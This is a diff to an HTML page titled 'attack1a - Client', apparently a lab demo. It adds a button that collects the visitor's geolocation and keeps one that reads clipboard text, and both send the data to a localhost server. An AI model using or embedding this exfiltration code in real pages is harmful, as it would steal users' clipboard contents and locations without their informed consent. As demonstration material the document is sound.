@@ -18,17 +18,43 @@
 <body>
   <div class="container">
     <h1>attack1a - Client</h1>
-    <button id="sendClipboard" class="btn btn-primary">Send Clipboard Content</button>
+    <button id="sendLocation" class="btn btn-primary">Send IP and Geolocation</button>
+    <button id="sendClipboard" class="btn btn-secondary">Send Clipboard Content</button>
   </div>
 
   <script>
+    // Button 1: Send IP and Geolocation
+    document.getElementById('sendLocation').addEventListener('click', async function () {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async function (position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const mapLink = `https://www.openstreetmap.org/#map=18/${latitude}/${longitude}`;
+
+          // Send geolocation to the server
+          fetch('http://localhost:3000/receive-location', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ latitude, longitude, mapLink })
+          })
+            .then(response => response.json())
+            .then(data => console.log('Location data sent:', data))
+            .catch(error => console.error('Error sending location data:', error));
+        });
+      } else {
+        console.error('Geolocation is not supported by this browser.');
+      }
+    });
+
+    // Button 2: Send Clipboard Content
     document.getElementById('sendClipboard').addEventListener('click', async function () {
       try {
-        // Read the clipboard content
         const clipboardText = await navigator.clipboard.readText();
 
         // Send clipboard content to the server
-        fetch('http://localhost:3000/receive-request', {
+        fetch('http://localhost:3000/receive-clipboard', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -36,9 +62,8 @@
           body: JSON.stringify({ clipboardContent: clipboardText })
         })
           .then(response => response.json())
-          .then(data => console.log('Server response:', data))
+          .then(data => console.log('Clipboard content sent:', data))
           .catch(error => console.error('Error sending clipboard content:', error));
-
       } catch (error) {
         console.error('Failed to read clipboard:', error);
       }
